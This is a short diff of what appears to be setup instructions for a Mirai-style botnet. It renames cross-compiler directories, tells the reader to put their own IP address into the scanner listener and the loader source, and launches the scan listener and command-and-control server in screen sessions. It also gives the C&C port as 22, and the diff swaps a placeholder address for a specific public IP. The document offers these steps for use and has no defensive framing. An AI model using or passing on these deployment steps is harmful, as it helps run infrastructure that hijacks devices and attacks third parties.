@@ -94,7 +94,7 @@ mv cross-compiler-armv6l armv6l
 mv cross-compiler-armv7l armv7l
 mv cross-compiler-x86_64 x86_64
 
-# Change IP (find 0.0.0.0 and replace with your IP)
+# Change IP (find 136.243.114.221 136,243,114,221 and replace with your IP)
 # Files to modify:
 scanListen.go
 loader/src/main.c
@@ -177,5 +177,6 @@ screen ./scanListen
 
 cd ~/
 screen ./cnc
+
 
 # C&C Port: 22
